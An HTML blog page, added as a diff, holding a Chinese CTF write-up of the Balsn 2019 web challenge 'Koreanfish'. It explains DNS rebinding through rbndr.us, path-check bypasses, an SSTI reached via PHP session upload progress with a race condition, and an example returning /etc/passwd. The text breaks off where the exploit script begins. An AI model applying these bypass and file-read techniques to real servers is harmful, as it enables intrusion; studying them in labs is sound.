@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言这次打了Balsn-ctf-2019感觉题目还不错因此总结一波。 0x01 Koreanfish题目描述台湾人喜欢韩国🐟 Difficulty:难 Type:web Solved:15/720 Tag:PHP,DNS Rebinding,Flask,Race condition,SSTI,RCE  Source Code这是一个白盒测试，并且全部的源码是非常短的并且是简单的。前置知识。Ses">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019balsnCTF的Warmup和koreanfish赛后复现">
+<meta property="og:url" content="http://yoursite.com/2019/12/19/2019balsnCTF的Warmup和koreanfish赛后复现/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言这次打了Balsn-ctf-2019感觉题目还不错因此总结一波。 0x01 Koreanfish题目描述台湾人喜欢韩国🐟 Difficulty:难 Type:web Solved:15/720 Tag:PHP,DNS Rebinding,Flask,Race condition,SSTI,RCE  Source Code这是一个白盒测试，并且全部的源码是非常短的并且是简单的。前置知识。Ses">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-12-19T11:15:32.147Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019balsnCTF的Warmup和koreanfish赛后复现">
+<meta name="twitter:description" content="前言这次打了Balsn-ctf-2019感觉题目还不错因此总结一波。 0x01 Koreanfish题目描述台湾人喜欢韩国🐟 Difficulty:难 Type:web Solved:15/720 Tag:PHP,DNS Rebinding,Flask,Race condition,SSTI,RCE  Source Code这是一个白盒测试，并且全部的源码是非常短的并且是简单的。前置知识。Ses">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/19/2019balsnCTF的Warmup和koreanfish赛后复现/">
+
+
+
+
+
+  <title>2019balsnCTF的Warmup和koreanfish赛后复现 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/19/2019balsnCTF的Warmup和koreanfish赛后复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019balsnCTF的Warmup和koreanfish赛后复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-19T19:14:27+08:00">
+                2019-12-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  14
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这次打了Balsn-ctf-2019感觉题目还不错因此总结一波。</p>
+<h4 id="0x01-Koreanfish"><a href="#0x01-Koreanfish" class="headerlink" title="0x01 Koreanfish"></a>0x01 Koreanfish</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><h5 id="台湾人喜欢韩国🐟"><a href="#台湾人喜欢韩国🐟" class="headerlink" title="台湾人喜欢韩国🐟"></a>台湾人喜欢韩国🐟</h5><ul>
+<li>Difficulty:难</li>
+<li>Type:web</li>
+<li>Solved:15/720</li>
+<li>Tag:PHP,DNS Rebinding,Flask,Race condition,SSTI,RCE</li>
+</ul>
+<h5 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a><a href="https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/Koreanfish/" target="_blank" rel="noopener">Source Code</a></h5><h5 id="这是一个白盒测试，并且全部的源码是非常短的并且是简单的。"><a href="#这是一个白盒测试，并且全部的源码是非常短的并且是简单的。" class="headerlink" title="这是一个白盒测试，并且全部的源码是非常短的并且是简单的。"></a>这是一个白盒测试，并且全部的源码是非常短的并且是简单的。</h5><h5 id="前置知识。"><a href="#前置知识。" class="headerlink" title="前置知识。"></a>前置知识。</h5><h5 id="Session上传进度。"><a href="#Session上传进度。" class="headerlink" title="Session上传进度。"></a>Session上传进度。</h5><h5 id="当-session-upload-progress-enabled-INI-选项开启时，PHP-能够在每一个文件上传时监测上传进度。-这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态"><a href="#当-session-upload-progress-enabled-INI-选项开启时，PHP-能够在每一个文件上传时监测上传进度。-这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态" class="headerlink" title="当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态"></a>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</h5><h5 id="当一个上传在处理中，同时POST一个与INI中设置的session-upload-progress-name同名变量时，上传进度可以在-SESSION中获得。-当PHP检测到这种POST请求时，它会在-SESSION中添加一组数据-索引是-session-upload-progress-prefix-与-session-upload-progress-name连接在一起的值。-通常这些键值可以通过读取INI设置来获得，例如"><a href="#当一个上传在处理中，同时POST一个与INI中设置的session-upload-progress-name同名变量时，上传进度可以在-SESSION中获得。-当PHP检测到这种POST请求时，它会在-SESSION中添加一组数据-索引是-session-upload-progress-prefix-与-session-upload-progress-name连接在一起的值。-通常这些键值可以通过读取INI设置来获得，例如" class="headerlink" title="当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得，例如"></a>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得，例如</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = ini_get(<span class="string">"session.upload_progress.prefix"</span>) . ini_get(<span class="string">"session.upload-progress.name"</span>);</span><br><span class="line">var_dump($_SESSION[$key]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="通过将-SESSION-key-“cancel-upload”-设置为TRUE，还可以取消一个正在处理中的文件上传。-当在同一个请求中上传多个文件，它仅会取消当前正在处理的文件上传和未处理的文件上传，但是不会移除那些已经完成的上传。-当一个上传请求被这么取消时，-FILES中的error将会被设置为-UPLOAD-ERR-EXTENSION。"><a href="#通过将-SESSION-key-“cancel-upload”-设置为TRUE，还可以取消一个正在处理中的文件上传。-当在同一个请求中上传多个文件，它仅会取消当前正在处理的文件上传和未处理的文件上传，但是不会移除那些已经完成的上传。-当一个上传请求被这么取消时，-FILES中的error将会被设置为-UPLOAD-ERR-EXTENSION。" class="headerlink" title="通过将$_SESSION[$key][“cancel_upload”]设置为TRUE，还可以取消一个正在处理中的文件上传。 当在同一个请求中上传多个文件，它仅会取消当前正在处理的文件上传和未处理的文件上传，但是不会移除那些已经完成的上传。 当一个上传请求被这么取消时，$_FILES中的error将会被设置为 UPLOAD_ERR_EXTENSION。"></a>通过将$_SESSION[$key][“cancel_upload”]设置为TRUE，还可以取消一个正在处理中的文件上传。 当在同一个请求中上传多个文件，它仅会取消当前正在处理的文件上传和未处理的文件上传，但是不会移除那些已经完成的上传。 当一个上传请求被这么取消时，$_FILES中的error将会被设置为 UPLOAD_ERR_EXTENSION。</h5><h5 id="session-upload-progress-freq-和-session-upload-progress-min-freq-INI选项控制了上传进度信息应该多久被重新计算一次。-通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。"><a href="#session-upload-progress-freq-和-session-upload-progress-min-freq-INI选项控制了上传进度信息应该多久被重新计算一次。-通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。" class="headerlink" title="session.upload_progress.freq 和 session.upload_progress.min_freq INI选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。"></a>session.upload_progress.freq 和 session.upload_progress.min_freq INI选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。</h5><h5 id="Example-1-样例信息"><a href="#Example-1-样例信息" class="headerlink" title="Example #1 样例信息"></a>Example #1 样例信息</h5><h5 id="一个上传进度数组的结构的例子"><a href="#一个上传进度数组的结构的例子" class="headerlink" title="一个上传进度数组的结构的例子"></a>一个上传进度数组的结构的例子</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&quot; value=&quot;123&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file2&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="在session中存放的数据看上去是这样子的："><a href="#在session中存放的数据看上去是这样子的：" class="headerlink" title="在session中存放的数据看上去是这样子的："></a>在session中存放的数据看上去是这样子的：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_SESSION[<span class="string">"upload_progress_123"</span>] = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time</span></span><br><span class="line"> <span class="string">"content_length"</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length</span></span><br><span class="line"> <span class="string">"bytes_processed"</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed</span></span><br><span class="line"> <span class="string">"done"</span> =&gt; <span class="keyword">false</span>,              <span class="comment">// true when the POST handler has finished, successfully or not</span></span><br><span class="line"> <span class="string">"files"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">"field_name"</span> =&gt; <span class="string">"file1"</span>,       <span class="comment">// Name of the &lt;input/&gt; field</span></span><br><span class="line">   <span class="comment">// The following 3 elements equals those in $_FILES</span></span><br><span class="line">   <span class="string">"name"</span> =&gt; <span class="string">"foo.avi"</span>,</span><br><span class="line">   <span class="string">"tmp_name"</span> =&gt; <span class="string">"/tmp/phpxxxxxx"</span>,</span><br><span class="line">   <span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">"done"</span> =&gt; <span class="keyword">true</span>,                <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line">   <span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,    <span class="comment">// When this file has started to be processed</span></span><br><span class="line">   <span class="string">"bytes_processed"</span> =&gt; <span class="number">57343250</span>, <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">  ),</span><br><span class="line">  <span class="comment">// An other file, not finished uploading, in the same request</span></span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">"field_name"</span> =&gt; <span class="string">"file2"</span>,</span><br><span class="line">   <span class="string">"name"</span> =&gt; <span class="string">"bar.avi"</span>,</span><br><span class="line">   <span class="string">"tmp_name"</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">   <span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">"done"</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">   <span class="string">"start_time"</span> =&gt; <span class="number">1234567899</span>,</span><br><span class="line">   <span class="string">"bytes_processed"</span> =&gt; <span class="number">54554</span>,</span><br><span class="line">  ),</span><br><span class="line"> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h5 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h5><h5 id="如果你看到这个源码index-php，你将会知道这第一步是去绕过ip限制。"><a href="#如果你看到这个源码index-php，你将会知道这第一步是去绕过ip限制。" class="headerlink" title="如果你看到这个源码index.php，你将会知道这第一步是去绕过ip限制。"></a>如果你看到这个源码<code>index.php</code>，你将会知道这第一步是去绕过<code>ip</code>限制。</h5><h5 id="事实上，这是一个明显的DNS重新绑定漏洞，可以绕过ip限制。"><a href="#事实上，这是一个明显的DNS重新绑定漏洞，可以绕过ip限制。" class="headerlink" title="事实上，这是一个明显的DNS重新绑定漏洞，可以绕过ip限制。"></a>事实上，这是一个明显的DNS重新绑定漏洞，可以绕过<code>ip</code>限制。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ip = @dns_get_record($res[&apos;host&apos;], DNS_A)[0][&apos;ip&apos;];</span><br><span class="line">...</span><br><span class="line">$dev_ip = &quot;54.87.54.87&quot;;</span><br><span class="line">if($ip === $dev_ip) &#123;</span><br><span class="line">    $content = file_get_contents($dst);</span><br></pre></td></tr></table></figure>
+
+<h5 id="这个file-get-contents-会再次查询DNS和读取响应。"><a href="#这个file-get-contents-会再次查询DNS和读取响应。" class="headerlink" title="这个file_get_contents()会再次查询DNS和读取响应。"></a>这个<code>file_get_contents()</code>会再次查询DNS和读取响应。</h5><h5 id="如果我们将域的A记录设置为54-87-54-87和127-0-0-1，则可以绕过IP限制查询内部服务。"><a href="#如果我们将域的A记录设置为54-87-54-87和127-0-0-1，则可以绕过IP限制查询内部服务。" class="headerlink" title="如果我们将域的A记录设置为54.87.54.87和127.0.0.1，则可以绕过IP限制查询内部服务。"></a>如果我们将域的A记录设置为<code>54.87.54.87</code>和<code>127.0.0.1</code>，则可以绕过IP限制查询内部服务。</h5><h5 id="如果没有然后域名可以用一些在线的DNS重新绑定服务，例如：rbndr-us。"><a href="#如果没有然后域名可以用一些在线的DNS重新绑定服务，例如：rbndr-us。" class="headerlink" title="如果没有然后域名可以用一些在线的DNS重新绑定服务，例如：rbndr.us。"></a>如果没有然后域名可以用一些在线的DNS重新绑定服务，例如：<code>rbndr.us</code>。</h5><h5 id="例如36573657-7f000001-rbndr-us将返回54-87-54-87或127-0-0-1。"><a href="#例如36573657-7f000001-rbndr-us将返回54-87-54-87或127-0-0-1。" class="headerlink" title="例如36573657.7f000001.rbndr.us将返回54.87.54.87或127.0.0.1。"></a>例如36573657.7f000001.rbndr.us将返回54.87.54.87或127.0.0.1。</h5><h5 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h5><h5 id="从dockerfile中，我们知道在同一台服务器上运行着一个简单的flask应用程序。"><a href="#从dockerfile中，我们知道在同一台服务器上运行着一个简单的flask应用程序。" class="headerlink" title="从dockerfile中，我们知道在同一台服务器上运行着一个简单的flask应用程序。"></a>从dockerfile中，我们知道在同一台服务器上运行着一个简单的flask应用程序。</h5><h5 id="并且在-error-page功能上存在明显的SSTI漏洞，它render-template-string-与可控的内容一起使用。"><a href="#并且在-error-page功能上存在明显的SSTI漏洞，它render-template-string-与可控的内容一起使用。" class="headerlink" title="并且在/error_page功能上存在明显的SSTI漏洞，它render_template_string()与可控的内容一起使用。"></a>并且在<code>/error_page</code>功能上存在明显的SSTI漏洞，它<code>render_template_string()</code>与可控的内容一起使用。</h5><h5 id="如果error-status设置为绝对路径，则返回路径os-path-join-将被覆盖。"><a href="#如果error-status设置为绝对路径，则返回路径os-path-join-将被覆盖。" class="headerlink" title="如果error_status设置为绝对路径，则返回路径os.path.join()将被覆盖。"></a>如果<code>error_status</code>设置为绝对路径，则返回路径<code>os.path.join()</code>将被覆盖。</h5><h5 id="例如os-path-join-quot-var-www-flask-quot-quot-error-quot-quot-etc-passwd-quot-将返回-etc-passwd。"><a href="#例如os-path-join-quot-var-www-flask-quot-quot-error-quot-quot-etc-passwd-quot-将返回-etc-passwd。" class="headerlink" title="例如os.path.join(&quot;/var/www/flask&quot;, &quot;error&quot;, &quot;/etc/passwd&quot;)将返回/etc/passwd。"></a>例如<code>os.path.join(&quot;/var/www/flask&quot;, &quot;error&quot;, &quot;/etc/passwd&quot;)</code>将返回<code>/etc/passwd</code>。</h5><h5 id="但是这里的问题是你不能直接触摸它-error-page。"><a href="#但是这里的问题是你不能直接触摸它-error-page。" class="headerlink" title="但是这里的问题是你不能直接触摸它/error_page。"></a>但是这里的问题是你不能直接触摸它<code>/error_page</code>。</h5><h5 id="由于前面的php将检查查询的路径，因此该路径必须包含字符串korea"><a href="#由于前面的php将检查查询的路径，因此该路径必须包含字符串korea" class="headerlink" title="由于前面的php将检查查询的路径，因此该路径必须包含字符串korea:"></a>由于前面的php将检查查询的路径，因此该路径必须包含字符串<code>korea</code>:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(stripos($res[&apos;path&apos;], &quot;korea&quot;) === FALSE) die(&quot;Error&quot;);</span><br></pre></td></tr></table></figure>
+
+<h5 id="有两种方法可以绕过此路径的限制："><a href="#有两种方法可以绕过此路径的限制：" class="headerlink" title="有两种方法可以绕过此路径的限制："></a>有两种方法可以绕过此路径的限制：</h5><h5 id="方法0x1"><a href="#方法0x1" class="headerlink" title="方法0x1"></a>方法0x1</h5><h5 id="你可以使用重定向："><a href="#你可以使用重定向：" class="headerlink" title="你可以使用重定向："></a>你可以使用重定向：</h5><h5 id="使用DNS重新绑定到服务器IP，然后设置-korea要重定向到的路径127-0-0-1-5000-error-page-err-。"><a href="#使用DNS重新绑定到服务器IP，然后设置-korea要重定向到的路径127-0-0-1-5000-error-page-err-。" class="headerlink" title="使用DNS重新绑定到服务器IP，然后设置/korea要重定向到的路径127.0.0.1:5000/error_page?=err......。"></a>使用DNS重新绑定到服务器IP，然后设置<code>/korea</code>要重定向到的路径<code>127.0.0.1:5000/error_page?=err......</code>。</h5><h5 id="原因是file-get-contents-将遵循302重定向。"><a href="#原因是file-get-contents-将遵循302重定向。" class="headerlink" title="原因是file_get_contents()将遵循302重定向。"></a>原因是<code>file_get_contents()</code>将遵循302重定向。</h5><h5 id="方法0x2"><a href="#方法0x2" class="headerlink" title="方法0x2"></a>方法0x2</h5><h5 id="使用Flask的特殊功能！"><a href="#使用Flask的特殊功能！" class="headerlink" title="使用Flask的特殊功能！"></a>使用Flask的特殊功能！</h5><h5 id="在flask应用程序中，-korea-ping等于-ping"><a href="#在flask应用程序中，-korea-ping等于-ping" class="headerlink" title="在flask应用程序中，//korea/ping等于/ping"></a>在flask应用程序中，<code>//korea/ping</code>等于<code>/ping</code></h5><h5 id="因此，你可以使用-korea-error-page-err-绕过限制。"><a href="#因此，你可以使用-korea-error-page-err-绕过限制。" class="headerlink" title="因此，你可以使用//korea/error_page?err=...绕过限制。"></a>因此，你可以使用<code>//korea/error_page?err=...</code>绕过限制。</h5><h5 id="step-3"><a href="#step-3" class="headerlink" title="step 3"></a>step 3</h5><h5 id="现在，我们可以控制render-template-string-读取内容的路径。"><a href="#现在，我们可以控制render-template-string-读取内容的路径。" class="headerlink" title="现在，我们可以控制render_template_string()读取内容的路径。"></a>现在，我们可以控制<code>render_template_string()</code>读取内容的路径。</h5><h5 id="你应该可以找到一个可以放置我们可控有效负载的文件。"><a href="#你应该可以找到一个可以放置我们可控有效负载的文件。" class="headerlink" title="你应该可以找到一个可以放置我们可控有效负载的文件。"></a>你应该可以找到一个可以放置我们可控有效负载的文件。</h5><h5 id="由于服务器使用php运行，因此可以使用该session-upload-progress方法将SSTI有效负载上传到会话文件。"><a href="#由于服务器使用php运行，因此可以使用该session-upload-progress方法将SSTI有效负载上传到会话文件。" class="headerlink" title="由于服务器使用php运行，因此可以使用该session.upload_progress方法将SSTI有效负载上传到会话文件。"></a>由于服务器使用php运行，因此可以使用该<code>session.upload_progress</code>方法将SSTI有效负载上传到会话文件。</h5><h5 id="如果PHP-SESSION-UPLOAD-PROGRESS在多部分POST数据中提供，PHP将为您启用会话。"><a href="#如果PHP-SESSION-UPLOAD-PROGRESS在多部分POST数据中提供，PHP将为您启用会话。" class="headerlink" title="如果PHP_SESSION_UPLOAD_PROGRESS在多部分POST数据中提供，PHP将为您启用会话。"></a>如果PHP_SESSION_UPLOAD_PROGRESS在多部分POST数据中提供，PHP将为您启用会话。</h5><p>#####（概念与HITCON CTF 2018相同-一行php挑战：<a href="https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html" target="_blank" rel="noopener">链接</a>）</p>
+<p>#####（注意：您的有效载荷不能包含|，因为这会破坏会话内容格式。）</p>
+<h5 id="step-4"><a href="#step-4" class="headerlink" title="step 4"></a>step 4</h5><h5 id="默认session-upload-progress-cleanup设置为On，因此您的SSTI有效负载将被快速清除。"><a href="#默认session-upload-progress-cleanup设置为On，因此您的SSTI有效负载将被快速清除。" class="headerlink" title="默认session.upload_progress.cleanup设置为On，因此您的SSTI有效负载将被快速清除。"></a>默认<code>session.upload_progress.cleanup</code>设置为On，因此您的SSTI有效负载将被快速清除。</h5><h5 id="我们可以用条件竞争绕过。"><a href="#我们可以用条件竞争绕过。" class="headerlink" title="我们可以用条件竞争绕过。"></a>我们可以用条件竞争绕过。</h5><h5 id="利用脚本："><a href="#利用脚本：" class="headerlink" title="利用脚本："></a>利用脚本：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 